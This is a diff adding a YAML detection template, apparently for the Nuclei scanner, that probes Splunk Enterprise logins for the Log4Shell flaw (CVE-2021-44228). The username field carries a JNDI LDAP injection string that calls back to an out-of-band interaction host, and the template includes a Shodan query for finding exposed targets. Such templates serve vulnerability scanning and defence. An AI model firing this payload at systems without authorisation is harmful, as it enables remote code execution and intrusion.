@@ -1,0 +1,64 @@
+http:
+    - extractors:
+        - kval:
+            - interactsh_ip
+          type: kval
+        - group: 2
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+        - group: 1
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+        - part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          POST /en-US/account/login HTTP/1.1
+          Host: {{Hostname}}
+          Accept: text/javascript, text/html, application/xml, text/xml, /
+          X-Requested-With: XMLHttpRequest
+          Origin: {{RootURL}}
+          Referer: {{RootURL}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          cval={{unix_time()}}&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&return_to=%2Fen-US%2F
+id: splunk-enterprise-log4j-rce
+info:
+    author: shaikhyaser
+    classification:
+        cve-id: CVE-2021-44228
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        Splunk Enterprise is susceptible to Log4j JNDI remote code execution. Splunk Enterprise enables you to search, analyze and visualize your data to quickly act on insights from across your technology landscape.
+    metadata:
+        max-request: 1
+        shodan-query: http.title:"Login - Splunk"
+    name: Splunk Enterprise - Remote Code Execution (Apache Log4j)
+    reference:
+        - https://www.splunk.com/en_us/blog/bulletins/splunk-security-advisory-for-apache-log4j-cve-2021-44228.html
+    severity: critical
+    tags:
+        - jndi
+        - log4j
+        - splunk
+        - oast
+        - kev
+        - Splunk
+variables:
+    rand1: '{{rand_int(111, 999)}}'
+    rand2: '{{rand_int(111, 999)}}'
+    str: '{{rand_base(5)}}'
